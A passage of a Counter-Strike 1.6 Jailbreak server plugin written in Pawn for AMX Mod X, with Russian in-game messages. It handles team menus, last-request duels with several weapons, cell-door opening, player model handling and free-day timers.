					else
					client_cmd(id, "say /adminka")	
			}
			case 5: 
			{
					if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
					client_cmd(id, "say /adminka")
					else
					{
						if(get_user_flags(id) & ADMIN_LEVEL_B)
						{
							jb_open_svipmenu(id)
						}
						else if(get_user_flags(id) & ADMIN_LEVEL_C)
						{
							jb_open_vipmenu(id)
					}
					}
			}
			case 6:
			{
				if(g_Fdall && g_PlayerLast <= 0 && !round_restart)
				{
					if(get_user_flags(id) & ADMIN_LEVEL_B)
					{
						jb_open_svipmenu(id)
					}
					else if(get_user_flags(id) & ADMIN_LEVEL_C)
					{
						jb_open_vipmenu(id)
					}
				}
			}
		}
	}
	else if(get_user_team(id) == 2)
	{	   
        	switch(key)
        	{
			case 0:
			{
				if(g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
				client_cmd(id, "say /open")
				else {
				if(g_Simon <= 0){
				cmd_simon(id)
				cmd_simonmenu(id)
				}
				else if(g_Simon == id)
				cmd_simonmenu(id)
				else if(g_Simon > 0 && g_Simon != id)
				client_cmd(id, "say /shop")
				}
			}
			case 1: 
			{
				if(g_Fdall)
				client_cmd(id, "say /shop")
				else {
				if(g_Simon == id || g_Simon == 0)
				client_cmd(id, "say /shop")
				else 
				client_cmd(id, "say /transfer")
				}
			}
			case 2: 
			{
				if(g_Fdall)
				client_cmd(id, "say /transfer")
				else {
				if(g_Simon == id || g_Simon == 0)
				client_cmd(id, "say /transfer")
				else 
				team_menu(id)
				}
			}
			case 3: 
			{
				if(g_Fdall)
				team_menu(id)
				else {
				if(g_Simon == id || g_Simon == 0)
				team_menu(id)
				else 
				client_cmd(id, "say /adminka")
				}
			}
			case 4: 
			{
				if(g_Fdall)
				client_cmd(id, "say /adminka")
				else if(g_Simon == id || g_Simon == 0)
				{
				client_cmd(id, "say /adminka")
				}
				else if(g_Simon != id)
				{
						if(get_user_flags(id) & ADMIN_LEVEL_B)
						{
							jb_open_svipmenu(id)	// Натив открытия супер вип меню
						}
						else if(get_user_flags(id) & ADMIN_LEVEL_C)
						{
							jb_open_vipmenu(id)		// Натив открытия вип меню
						}
				}
			}
			case 5:
			{
				if(g_Simon == id || g_Simon == 0)
				{
					if(g_PlayerLast <= 0 && !round_restart)
					{
					if(get_user_flags(id) & ADMIN_LEVEL_B)
					{
						jb_open_svipmenu(id)
					}
					else if(get_user_flags(id) & ADMIN_LEVEL_C)
					{
						jb_open_vipmenu(id)
					}
					}
				}
			}
		}
	}
	else if(get_user_team(id) != 1 && get_user_team(id) != 2){
      		switch(key)
        	{
			case 0: 
			{
			team_menu(id)
			}
			case 1: 
			{
			ChatColor(id, "!yПодробности о покупке сборки -> !tSkype: !g%s !y| !tНик: !g%s", MySkype, NickSkype)
			ChatColor(id, "!yМы !tВКонтакте: !g%s", vkontakte)
			}
			case 2: 
			{
			ChatColor(id, "!yЧтобы купить Сборку сервера, обратитесь к Главному Админу!")
			ChatColor(id, "!yВКонтакте: !g%s !y| !tSkype: !g%s !y| !tНик: !g%s", VKadmin, MySkype, NickSkype)
			}
   		}
	}
	return PLUGIN_HANDLED
}

public cmd_lastrequest(id)
{
	if(g_Duel > 0 || g_LastDenied || g_PlayerLast != id || g_RoundEnd || !is_user_alive(id))
		return PLUGIN_HANDLED
		
	if(round_restart)
	{
		ChatColor(id, "%s !yДуэль не доступна во время рестарта!", Prefix)
		return PLUGIN_HANDLED
	}
	else if(CountCTLive <= 0)
	{
		ChatColor(id, "%s !yНе хватает Охранников для дуэли", Prefix)
		return PLUGIN_HANDLED
	}

	new Buffer[512]
	
	formatex(Buffer, charsmax(Buffer), "Ваш выбор желаний:")
	new menu = menu_create(Buffer, "lastrequest_select")
	
	if(!PlayDuel)
		formatex(Buffer, charsmax(Buffer), "Взять 16000$")
	else 
		formatex(Buffer, charsmax(Buffer), "\dВзять 16000$")
	menu_additem(menu, Buffer, "1")

	if(!PlayDuel)
		formatex(Buffer, charsmax(Buffer), "Забрать оружие у охраны")
	else 
		formatex(Buffer, charsmax(Buffer), "\dЗабрать оружие у охраны")
	menu_additem(menu, Buffer, "2")

	if(!PlayDuel)
		formatex(Buffer, charsmax(Buffer), "Взять Свободный день")
	else 	
		formatex(Buffer, charsmax(Buffer), "\dВзять Свободный день")
	menu_additem(menu, Buffer, "3")

	formatex(Buffer, charsmax(Buffer), "Взять голос на 1 раунд")
	menu_additem(menu, Buffer, "4")

	formatex(Buffer, charsmax(Buffer), "Дуэль на Кулаках")
	menu_additem(menu, Buffer, "5")

	formatex(Buffer, charsmax(Buffer), "Дуэль на Диглах")
	menu_additem(menu, Buffer, "6")

	formatex(Buffer, charsmax(Buffer), "Дуэль на Гранатах")
	menu_additem(menu, Buffer, "7")

	formatex(Buffer, charsmax(Buffer), "Дуэль на Пулеметах")
	menu_additem(menu, Buffer, "8")

	formatex(Buffer, charsmax(Buffer), "Дуэль на Авп")
	menu_additem(menu, Buffer, "9")

	formatex(Buffer, charsmax(Buffer), "Дуэль на Скаутах")
	menu_additem(menu, Buffer, "10")
	
	formatex(Buffer, charsmax(Buffer), "Дуэль на Кунаях")
	menu_additem(menu, Buffer, "11")

	formatex(Buffer, charsmax(Buffer), "Назад")
	menu_setprop(menu, MPROP_BACKNAME, Buffer)
	formatex(Buffer, charsmax(Buffer), "Далее")
	menu_setprop(menu, MPROP_NEXTNAME, Buffer)
	formatex(Buffer, charsmax(Buffer), "Выйти")
	menu_setprop(menu, MPROP_EXITNAME, Buffer)
	menu_display(id, menu, 0)
	return PLUGIN_HANDLED
}


public lastrequest_select(id, menu, item)
{
	if(item == MENU_EXIT || g_PlayerLast != id || g_LastDenied || !is_user_alive(id) || g_Duel)
	{
		menu_destroy(menu)
		return PLUGIN_HANDLED
	}

	new i, dst[32]

	new data[6], iName[64], access, callback
	menu_item_getinfo(menu, item, access, data, 5, iName, 63, callback)
  
	get_user_name(id, dst, charsmax(dst))

	new key = str_to_num(data)
	
	switch(key)
	{
		case 1:
		{
			if(!PlayDuel)
			{
				cs_set_user_money(id, 16000)
				DuelName = "выбрал 16 000$"
				user_silentkill(id)
				ChatColor(0, "%s !t%s !yвыбрал !g16 000$", Prefix, dst)
			}
			else
			{
				ChatColor(id, "%s !yНельзя выбрать, Вы уже сыграли дуэль", Prefix)
				cmd_lastrequest(id)
			}
		}
		case 2:
		{
			if(!PlayDuel)
			{
			g_Duel = 2
			
			for(new iPl = 1; iPl <= get_maxplayers(); iPl++)
			{
				if(is_user_alive(iPl))
				{
					player_strip_weapons(iPl)
				}
			}
			i = random_num(0, sizeof(_WeaponsFree) - 1)
			fm_give_item(id, _WeaponsFree[i])
			cs_set_user_bpammo(id, _WeaponsFreeCSW[i], 999)
			
			ChatColor(0, "%s !t%s !yвыбрал !gОтпиздить охранников", Prefix, dst)
			g_BlockWeapons = 1
			DuelName = "наказать охрану"
			}
			else
			{
				ChatColor(id, "%s !yНельзя выбрать, вы уже сыграли дуэль", Prefix)
				cmd_lastrequest(id)
			}			
		}
		case 3:
		{
			if(!PlayDuel)
			{
				g_Duel = 3
				g_FreedayAuto = id
				user_silentkill(id)
				DuelName = "выбрал Свободный День"
				ChatColor(0, "%s !t%s !yвыбрал !gСвободный День", Prefix, dst)
			}
			else
			{
				ChatColor(id, "%s !yНельзя выбрать, вы уже сыграли дуэль", Prefix)
				cmd_lastrequest(id)
			}
		}
		case 4:
		{	
			g_Duel = 4
			user_silentkill(id)
			set_bit(g_AutoVoice, id)
			DuelName = "выбрал голос"
			ChatColor(0, "%s !t%s !yвыбрал !gВозможность говорить 1 раунд", Prefix, dst)
		}
		case 5:
		{
			g_Duel = 5
			menu_players(id, CS_TEAM_CT, 0, 1, "duel_knives", "Выберите игрока:")
		}
		default:
		{
			g_Duel = key
			menu_players(id, CS_TEAM_CT, 0, 1, "duel_guns", "Выберите игрока:")
		}
	}
	menu_destroy(menu)
	return PLUGIN_HANDLED
}



public duel_knives(id, menu, item)
{
	if(item == MENU_EXIT || g_PlayerLast != id)
	{
		menu_destroy(menu)
		g_LastDenied = 0
		g_Duel = 0
		return PLUGIN_HANDLED
	}
	PlayDuel = true
	
	static dst[32], data[5], access, callback, player, src[32]

	menu_item_getinfo(menu, item, access, data, charsmax(data), dst, charsmax(dst), callback)
	get_user_name(id, src, charsmax(src))
	player = str_to_num(data)
	
	ChatColor(0, "%s !g%s !yвыбрал дуэль на !tкулаках", Prefix, src)
	ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, src, dst)

	if(id > 0 && is_user_connected(id) && is_user_alive(id))
	{	
	g_DuelA = id
	player_strip_weapons(id)
	set_user_noclip(id, 0)
	set_user_godmode(id, 0)
	set_user_armor(id, 0)
	set_user_maxspeed(id, 240.0)
	set_user_health(id, 100)
	set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)

	}
	if(player > 0 && is_user_connected(player) && is_user_alive(player))
	{
	g_DuelB = player
	player_strip_weapons(player)
	set_user_noclip(player, 0)
	set_user_godmode(player, 0)
	set_user_armor(player, 0)
	set_user_maxspeed(player, 240.0)
	set_user_health(player, 100)
	set_user_rendering(player, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)
	}
	DuelName = "Кулаки"
	g_BlockWeapons = 1
	return PLUGIN_HANDLED
}

public duel_guns(id, menu, item)
{
	if(item == MENU_EXIT || g_PlayerLast != id)
	{
		menu_destroy(menu)
		g_LastDenied = 0
		g_Duel = 0
		return PLUGIN_HANDLED
	}
	PlayDuel = true
	
	static dst[32], data[5], access, callback, player, src[32]

	menu_item_getinfo(menu, item, access, data, charsmax(data), dst, charsmax(dst), callback)
	get_user_name(id, src, charsmax(src))
	player = str_to_num(data)
	
	client_cmd(0,"mp3 play %s", SOUND_DUEL) 
	
	set_user_noclip(id, 0)
	set_user_godmode(id, 0)
	set_user_maxspeed(id, 240.0)
	set_user_health(id, 2000)
	set_user_armor(id, 0)
	set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)

	set_user_health(player, 2000)
	set_user_maxspeed(player, 240.0)
	set_user_noclip(player, 0)
	set_user_godmode(player, 0)
	set_user_armor(player, 0)
	set_user_rendering(player, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)
	
	switch(g_Duel)
	{
		case 6:
		{
			g_DuelA = id
			player_strip_weapons(id)

			g_DuelB = player
			player_strip_weapons(player)

			duels_menu(id) 
		}
		case 7:
		{
			ChatColor(0, "%s !g%s !yвыбрал дуэль на !tГранатах", Prefix, src)
			ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, src, dst)

			if(id > 0 && is_user_connected(id) && is_user_alive(id))
			{
				g_DuelA = id
				player_strip_weapons(id)

				new iEnt = fm_give_item(id, "weapon_hegrenade")

				if (is_valid_ent(iEnt))
					cs_set_weapon_ammo(iEnt, 1)

				set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)
				set_user_health(id, 2000)
			}
			if(player > 0 && is_user_connected(player) && is_user_alive(player))
			{
				g_DuelB = player
				player_strip_weapons(player)

				new iEnt = fm_give_item(player, "weapon_hegrenade")

				if (is_valid_ent(iEnt))
					cs_set_weapon_ammo(iEnt, 1)

				set_user_rendering(player, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)

				set_user_health(player, 1000)
				
			}
			DuelName = "Гранаты"
			g_BlockWeapons = 1
		}
		case 8:
		{
			ChatColor(0, "%s !g%s !yвыбрал дуэль на !tПулемётах", Prefix, src)
			ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, src, dst)

			if(id > 0 && is_user_connected(id) && is_user_alive(id))
			{
				g_DuelA = id
				player_strip_weapons(id)
				//cs_set_user_bpammo(id, CSW_M249,0)

				new iEnt = fm_give_item(id, "weapon_m249")

				if (is_valid_ent(iEnt))
					cs_set_weapon_ammo(iEnt, 2000)

				set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)

				set_user_health(id, 2000)
			}
			if(player > 0 && is_user_connected(player) && is_user_alive(player))
			{
				g_DuelB = player
				player_strip_weapons(player)
				//cs_set_user_bpammo(player, CSW_M249, 0)

				new iEnt = fm_give_item(player, "weapon_m249")

				if (is_valid_ent(iEnt))
					cs_set_weapon_ammo(iEnt, 2000)

				set_user_rendering(player, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)

				set_user_health(player, 2000)
				
			}
			DuelName = "Пулемёты"
			g_BlockWeapons = 1
		}	
		case 9:
		{
			g_DuelA = id
			player_strip_weapons(id)

			duels_menu(id) 

			g_DuelB = player
			player_strip_weapons(player)

			DuelName = "Снайперки"
			g_BlockWeapons = 1
		}
		case 10:
		{
			g_DuelA = id
			player_strip_weapons(id)

			duels_menu(id) 

			g_DuelB = player
			player_strip_weapons(player)

			DuelName = "Скауты"
			g_BlockWeapons = 1
		}
		case 11:
		{
			ChatColor(0, "%s !g%s !yвыбрал дуэль на !tКунаях", Prefix, src)
			ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, src, dst)

			if(id > 0 && is_user_connected(id) && is_user_alive(id))
			{
				g_DuelA = id
				player_strip_weapons(id)

				jb_set_ninja(id)
				jb_setammo_ninja(id, 9999)

				set_user_health(id, 500)
				set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)
			}
			if(player > 0 && is_user_connected(player) && is_user_alive(player))
			{
				g_DuelB = player
				player_strip_weapons(player)
				
				jb_set_ninja(player)
				jb_setammo_ninja(player, 9999)

				set_user_health(player, 500)
				set_user_rendering(player, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)
			}
			DuelName = "Кунаи"
			g_BlockWeapons = 1
		}
		
	}
	return PLUGIN_HANDLED
}
 
public duels_menu(id) 
{
	new Buffer[256]

	formatex(Buffer, charsmax(Buffer), "Режим Дуэли")
	new menu = menu_create(Buffer, "menu_duels")

	formatex(Buffer, charsmax(Buffer), "Дуэль \yЧестная")
	menu_additem(menu, Buffer, "1")

	formatex(Buffer, charsmax(Buffer), "Дуэль \rНечестная")
	menu_additem(menu, Buffer, "2")

	menu_setprop(menu, MPROP_EXIT, MEXIT_NEVER)
	     
	menu_display(id,menu,0)
	return PLUGIN_HANDLED
}

public menu_duels(id, menu, item) 
{
	if(item == MENU_EXIT) 
	{
		menu_destroy(menu)
	        return PLUGIN_HANDLED
	}
	     
	new data[6], iName[64], access, callback
	menu_item_getinfo(menu, item, access, data, 5, iName, 63, callback)
	     
	new key = str_to_num(data)

	g_DuelType = key 
	ActionDuel(key)

	return PLUGIN_HANDLED
}

stock ActionDuel(iType)
{
	new szNameA[32], szNameB[32]
	new iWeapon

	get_user_name(g_DuelA, szNameA, charsmax( szNameA ))
	get_user_name(g_DuelB, szNameB, charsmax( szNameB ))

	switch( g_Duel )
	{
		case 6:
		{
			ChatColor(0, "%s !g%s !yвыбрал дуэль на !tДиглах", Prefix, szNameA)
			ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, szNameA, szNameB)

			if(iType == 1)
			{
				ChatColor(0, "%s !yТип дуэли: !tЧестную дуэль!", Prefix)
			}else
			if(iType == 2)
			{
				ChatColor(0, "%s !yТип дуэли: !tНечестную дуэль!", Prefix)
			}

			strip_user_weapons(g_DuelA)
			strip_user_weapons(g_DuelB)

			iWeapon = fm_give_item(g_DuelA, "weapon_deagle")
			if(is_valid_ent( iWeapon ))
			{
				if(iType == 1)
				{
					cs_set_weapon_ammo(iWeapon, 1)

					iPlayerShootTime[g_DuelA] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelA + 10000, _, _, "b")
				}else
				if(iType == 2)
				{
					cs_set_weapon_ammo(iWeapon, 1)
				}
			}

			iWeapon = fm_give_item(g_DuelB, "weapon_deagle")
			if(is_valid_ent( iWeapon ))
			{
				if(iType == 1)
				{
					cs_set_weapon_ammo(iWeapon, 0)
				}else
				if(iType == 2)
				{
					cs_set_weapon_ammo(iWeapon, 1)
				}
			}

			set_user_health(g_DuelA, 100)
			set_user_health(g_DuelB, 100)

			set_user_rendering(g_DuelA, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)
			set_user_rendering(g_DuelB, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)
		}

		case 9:
		{
			ChatColor(0, "%s !g%s !yвыбрал дуэль на !tAWP", Prefix, szNameA)
			ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, szNameA, szNameB)

			if(iType == 1)
			{
				ChatColor(0, "%s !yТип дуэли: !tЧестную дуэль!", Prefix)
			}else
			if(iType == 2)
			{
				ChatColor(0, "%s !yТип дуэли: !tНечестную дуэль!", Prefix)
			}

			strip_user_weapons(g_DuelA)
			strip_user_weapons(g_DuelB)

			iWeapon = fm_give_item(g_DuelA, "weapon_awp")
			if(is_valid_ent( iWeapon ))
			{
				if(iType == 1)
				{
					cs_set_weapon_ammo(iWeapon, 1)

					iPlayerShootTime[g_DuelA] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelA + 10000, _, _, "b")
				}else
				if(iType == 2)
				{
					cs_set_weapon_ammo(iWeapon, 1)
				}
			}

			iWeapon = fm_give_item(g_DuelB, "weapon_awp")
			if(is_valid_ent( iWeapon ))
			{
				if(iType == 1)
				{
					cs_set_weapon_ammo(iWeapon, 0)
				}else
				if(iType == 2)
				{
					cs_set_weapon_ammo(iWeapon, 1)
				}
			}

			set_user_health(g_DuelA, 100)
			set_user_health(g_DuelB, 100)

			set_user_rendering(g_DuelA, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)
			set_user_rendering(g_DuelB, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)
		}

		case 10:
		{
			ChatColor(0, "%s !g%s !yвыбрал дуэль на !tСкаутах", Prefix, szNameA)
			ChatColor(0, "%s !tДуэль: !g%s !yпротив Охранника: !g%s", Prefix, szNameA, szNameB)

			if(iType == 1)
			{
				ChatColor(0, "%s !yТип дуэли: !tЧестную дуэль!", Prefix)
			}else
			if(iType == 2)
			{
				ChatColor(0, "%s !yТип дуэли: !tНечестную дуэль!", Prefix)
			}

			strip_user_weapons(g_DuelA)
			strip_user_weapons(g_DuelB)

			iWeapon = fm_give_item(g_DuelA, "weapon_scout")
			if(is_valid_ent( iWeapon ))
			{
				if(iType == 1)
				{
					cs_set_weapon_ammo(iWeapon, 1)

					iPlayerShootTime[g_DuelA] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelA + 10000, _, _, "b")
				}else
				if(iType == 2)
				{
					cs_set_weapon_ammo(iWeapon, 1)
				}
			}

			iWeapon = fm_give_item(g_DuelB, "weapon_scout")
			if(is_valid_ent( iWeapon ))
			{
				if(iType == 1)
				{
					cs_set_weapon_ammo(iWeapon, 0)

				}else
				if(iType == 2)
				{
					cs_set_weapon_ammo(iWeapon, 1)
				}
			}

			set_user_health(g_DuelA, 100)
			set_user_health(g_DuelB, 100)

			set_user_rendering(g_DuelA, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0)
			set_user_rendering(g_DuelB, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0)
		}
	}
}

public DelayShootTime(id)
{
	id -= 10000

	--iPlayerShootTime[id]

	if(iPlayerShootTime[id] <= 0)
	{
		entity_set_int(id, EV_INT_button, entity_get_int(id,EV_INT_button) | IN_ATTACK)

		remove_task(id + 10000)
		iPlayerShootTime[id] = 0
	}else{
		client_print(id, print_center, "У вас %d секунд, чтобы сделать выстрел", iPlayerShootTime[id])
	}
}

public fwPlaybackEvent(flags, id, eventid, uc_handle)
{
	if(!g_Duel)
		return PLUGIN_HANDLED

	if(id != g_DuelA || id != g_DuelB)
		return PLUGIN_HANDLED

	if(!is_user_connected(id) || is_user_bot(id))
	{
		return PLUGIN_HANDLED
	}

	switch( g_Duel )
	{
		case 6:
		{
			if(!is_user_connected(g_DuelA) || !is_user_connected(g_DuelB))
				return PLUGIN_HANDLED

			if(g_DuelType == 1)
			{
				if(cs_get_user_team(id) & CS_TEAM_CT)
				{
					client_print(g_DuelB, print_center, "")
					remove_task(g_DuelB + 10000)

					iPlayerShootTime[g_DuelA] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelA + 10000, _, _, "b")

					set_player_ammo(g_DuelA, 1)
				}else 
				if(cs_get_user_team(id) & CS_TEAM_T)
				{
					client_print(g_DuelA, print_center, "")
					remove_task(g_DuelA + 10000)

					iPlayerShootTime[g_DuelB] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelB + 10000, _, _, "b")

					set_player_ammo(g_DuelB, 1)
				}
			}else
			if(g_DuelType == 2)
			{
				cs_set_user_bpammo(g_DuelA, CSW_DEAGLE, 1)
				cs_set_user_bpammo(g_DuelB, CSW_DEAGLE, 1)
			}
		}

		case 9:
		{
			if(!is_user_connected(g_DuelA) || !is_user_connected(g_DuelB))
				return PLUGIN_HANDLED

			if(g_DuelType == 1)
			{
				if(cs_get_user_team(id) & CS_TEAM_CT)
				{
					client_print(g_DuelB, print_center, "")
					remove_task(g_DuelB + 10000)

					iPlayerShootTime[g_DuelA] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelA + 10000, _, _, "b")

					set_player_ammo(g_DuelA, 1)
				}else 
				if(cs_get_user_team(id) & CS_TEAM_T)
				{
					client_print(g_DuelA, print_center, "")
					remove_task(g_DuelA + 10000)

					iPlayerShootTime[g_DuelB] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelB + 10000, _, _, "b")

					set_player_ammo(g_DuelB, 1)
				}
			}else
			if(g_DuelType == 2)
			{
				cs_set_user_bpammo(g_DuelA, CSW_AWP, 1)
				cs_set_user_bpammo(g_DuelB, CSW_AWP, 1)
			}
		}

		case 10:
		{
			if(!is_user_connected(g_DuelA) || !is_user_connected(g_DuelB))
				return PLUGIN_HANDLED

			if(g_DuelType == 1)
			{
				if(cs_get_user_team(id) & CS_TEAM_CT)
				{
					client_print(g_DuelB, print_center, "")
					remove_task(g_DuelB + 10000)

					iPlayerShootTime[g_DuelA] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelA + 10000, _, _, "b")

					set_player_ammo(g_DuelA, 1)
				}else 
				if(cs_get_user_team(id) & CS_TEAM_T)
				{
					client_print(g_DuelA, print_center, "")
					remove_task(g_DuelA + 10000)

					iPlayerShootTime[g_DuelB] = DUEL_SHOOTTIME
					set_task(1.0, "DelayShootTime", g_DuelB + 10000, _, _, "b")

					set_player_ammo(g_DuelB, 1)
				}
			}else
			if(g_DuelType == 2)
			{
				cs_set_user_bpammo(g_DuelA, CSW_SCOUT, 1)
				cs_set_user_bpammo(g_DuelB, CSW_SCOUT, 1)
			}
		}
	}
	return PLUGIN_CONTINUE
}

stock set_player_ammo(id, iAmmo)
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED

	new szWeaponName[32]
	new iWeapon, iWeaponID

	iWeaponID = get_user_weapon(id)
	get_weaponname(iWeaponID, szWeaponName, charsmax( szWeaponName ))

	iWeapon = find_ent_by_owner(-1, szWeaponName, id)
	if(iWeapon > 0)
		cs_set_weapon_ammo(iWeapon, iAmmo)

	return PLUGIN_CONTINUE
}

public precache_spawn(ent)
{
	if(is_valid_ent(ent))
	{
		static szClass[33]
		entity_get_string(ent, EV_SZ_classname, szClass, sizeof(szClass))
		for(new i = 0; i < sizeof(_RemoveEntities); i++)
			if(equal(szClass, _RemoveEntities[i]))
			remove_entity(ent)
	}
}

public precache_keyvalue(ent, kvd_handle)
{
	static info[32]
	if(!is_valid_ent(ent))
		return FMRES_IGNORED
	
	get_kvd(kvd_handle, KV_ClassName, info, charsmax(info))
	if(!equal(info, "multi_manager"))
		return FMRES_IGNORED
	
	get_kvd(kvd_handle, KV_KeyName, info, charsmax(info))
	TrieSetCell(g_CellManagers, info, ent)
	return FMRES_IGNORED
}  

public setup_buttons()
{
	new ent[3]
	new Float:origin[3]
	new info[32]
	new pos

	while((pos <= sizeof(g_Buttons)) && (ent[0] = engfunc(EngFunc_FindEntityByString, ent[0], "classname", "info_player_deathmatch")))
	{
		pev(ent[0], pev_origin, origin)
		while((ent[1] = engfunc(EngFunc_FindEntityInSphere, ent[1], origin, 200.0)))
		{
			if(!is_valid_ent(ent[1]))
				continue
		
			entity_get_string(ent[1], EV_SZ_classname, info, charsmax(info))
			if(!equal(info, "func_door"))
				continue
			
			entity_get_string(ent[1], EV_SZ_targetname, info, charsmax(info))
			if(!info[0])
				continue
			
			if(TrieKeyExists(g_CellManagers, info))
			{
				TrieGetCell(g_CellManagers, info, ent[2])
			}
			else ent[2] = engfunc(EngFunc_FindEntityByString, 0, "target", info)
			
			if(is_valid_ent(ent[2]) && (in_array(ent[2], g_Buttons, sizeof(g_Buttons)) < 0))
			{
				g_Buttons[pos] = ent[2]
				pos++
				break
			}
		}
	}
	TrieDestroy(g_CellManagers)
}

stock in_array(needle, data[], size)
{
	for(new i = 0; i < size; i++)
	{
		if(data[i] == needle)
			return i
	}
	return -1
}


public jail_opened(id)
{
	if(is_user_alive(id) && g_Fdall || g_PlayerLast > 0 && is_user_alive(id) || round_restart)
	jail_open()
	return PLUGIN_HANDLED
}

// Открытие клеток
public jail_open()
{
	
	static i
	for(i = 0; i < sizeof(g_Buttons); i++)
	{
		if(g_Buttons[i])
		{
			ExecuteHamB(Ham_Use, g_Buttons[i], 0, 0, 1, 1.0)
			entity_set_float(g_Buttons[i], EV_FL_frame, 0.0)
		}
	}
}
  
public msg_weappickup(msg_id, msg_dest, id)
{
	if(!is_user_connected(id))
		return

	if(get_msg_arg_int(1) == CSW_KNIFE)
	{
		if(get_user_team(id) == 1)
		{
				message_begin(MSG_ONE, get_user_msgid("WeaponList"), {0,0,0}, id)
				write_string("ujb_zek_hands")
				write_byte(-1)
				write_byte(-1)
				write_byte(-1)
				write_byte(-1)
				write_byte(2)
				write_byte(1)
				write_byte(CSW_KNIFE)
				write_byte(0)
				message_end()
			
		}
		else if(get_user_team(id) == 2)
		{
				message_begin(MSG_ONE, get_user_msgid("WeaponList"), {0,0,0}, id)
				write_string("ujb_guard_hands")
				write_byte(-1)
				write_byte(-1)
				write_byte(-1)
				write_byte(-1)
				write_byte(2)
				write_byte(1)
				write_byte(CSW_KNIFE)
				write_byte(0)
				message_end()		
		}
	}
}
  
// Блок команды model в консоле
public fw_SetClientKeyValue(id, const infobuffer[], const key[])
{
	if (get_bit(g_Model, id) && key[0] == 'm' && key[1] == 'o' && key[2] == 'd' && key[3] == 'e' && key[4] == 'l')
	{
		new szModel[32]
		jb_get_model(id, szModel, charsmax(szModel))

  		if(!equal(szModel, g_szModel[id]))
			jb_set_model(id, g_szModel[id])

		return FMRES_SUPERCEDE;
	}
	return FMRES_IGNORED
}
 
// Выдача модели
public jb_set_model(id, const szModel[])
{
	engfunc(EngFunc_SetClientKeyValue, id, engfunc(EngFunc_GetInfoKeyBuffer, id), "model", szModel);
	copy(g_szModel[id], charsmax(g_szModel[]), szModel);
	set_bit(g_Model, id);

	new szBuffer[64];
	formatex(szBuffer, charsmax(szBuffer), "models/player/%s/%s.mdl", szModel, szModel);
	set_pdata_int(id, 491, engfunc(EngFunc_ModelIndex, szBuffer), 5);
}
 
// Сброс модели
public jb_reset_model(id)
{
	if(get_user_team(id) == 1 && is_user_alive(id))
	{
		jb_set_model(id, ZekUJB)
		if(g_Fdall)
		{
			entity_set_int(id, EV_INT_skin, 5)
		}
		else if(get_bit(g_PlayerFreeday, id))
		{
			entity_set_int(id, EV_INT_skin, 5)
		}
		else if(get_bit(g_PlayerWanted, id))
		{
			entity_set_int(id, EV_INT_skin, 6)	
		}
		else entity_set_int(id, EV_INT_skin, random_num(0, 3))
	}
	else if(get_user_team(id) == 2 && is_user_alive(id))
	{
		if(g_Simon == id)
		{
			jb_set_model(id, SimonUJB)
		}
		else
		{
			jb_set_model(id, GuardUJB)
		}
	}
}

stock freeday_end_all()
{
	for(new id = 1; id <= get_maxplayers(); id++){
	if(g_Fdall)
	{
		if(!is_user_alive(id) || get_bit(g_PlayerWanted, id))
			continue
		
		if(get_user_team(id) == 1 && !jb_get_svip_model(id))
		{
			entity_set_int(id, EV_INT_skin, random_num(0, 3))
		}
		else if(get_user_team(id) == 1 && jb_get_svip_model(id))
		{
			jb_set_model(id, SuperVIP)
		}
	}
	
	}
	ChatColor(0, "%s !yУ заключенных закончился !gСвободный День", Prefix)
	g_Fdall = false
	g_Fdalltime = 0
	client_cmd(0, "spk UJB/gong.wav")
	return PLUGIN_HANDLED
}

public GetTimeFD(id)
{
	id = id - TASK_FD_ONE
		
	if(!is_user_alive(id))
	{
		remove_task(id + TASK_FD_ONE)
		clear_bit(g_PlayerFreeday, id)
		return PLUGIN_HANDLED
	}

	if(szPlayerFDTime[id] > 0)
	{
		szPlayerFDTime[id]--

		formatex(szTimeFD[id], 31, " %d сек ", szPlayerFDTime[id])
	}
	else if(szPlayerFDTime[id] <= 0)
	{
		id = id + TASK_FD_ONE
		freeday_end_one(id)
	}
	
	return PLUGIN_HANDLED
}

stock freeday_end_one(id)
{
	id = id - TASK_FD_ONE
	if(get_bit(g_PlayerFreeday, id) && is_user_alive(id))
	{
		if(get_user_team(id) == 1)
		{
			new name[32]
			get_user_name(id, name, 31)
			
			if(!jb_get_svip_model(id))
			entity_set_int(id, EV_INT_skin, random_num(0, 3))
			else
			jb_set_model(id, SuperVIP)
			iFreeDay--
			clear_bit(g_PlayerFreeday, id)
			ChatColor(0, "%s !yУ заключенного: !g%s !yзакончился !tСвободный День", Prefix, name)
		}
	}
